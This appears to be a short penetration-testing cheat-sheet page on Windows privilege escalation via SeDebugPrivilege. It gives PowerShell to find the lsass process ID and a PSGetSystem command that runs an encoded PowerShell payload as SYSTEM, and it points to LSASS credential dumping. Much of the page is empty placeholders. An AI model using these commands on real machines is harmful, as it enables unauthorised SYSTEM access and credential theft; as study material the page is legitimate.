---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "SEDEBUGPRIVILEGE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Theory*

---

#### *RCE as Local System*

##### *PSGetSystem*

> ***[PSGetSystem](https://github.com/decoder-it/psgetsystem)***

###### *Setup*

- ***From the Attacker*** ⚔️

```bash

```

- ***From the Target*** 🎯 

```bash
```

###### *Process PID as Local System*

```bash
( Get-Process | ? { $_.ProcessName -eq '<PROCESS_NAME>' } ).Id
```

> [!DANGER]- e.g.
>
> ```bash
> ( Get-Process | ? { $_.ProcessName -eq 'lsass' } ).Id
> ```
>

###### *Command Execution*

```bash
ImpersonateFromParentPid -ppid <PARENT_PID> -command "<COMMAND>" -cmdargs "<COMMAND_ARGS>"
```

> [!DANGER]- *e.g.*
>
> ```bash
> ImpersonateFromParentPid -ppid <PARENT_PID> -command "C:\Windows\System32\cmd.exe" -cmdargs "/c powershell.exe -EncodedCommand <BASE64_STRING>"
> ```
>


#### *LSASS Dump*

> ***[[LSASS|See here]] for memory data exfiltration on Windows***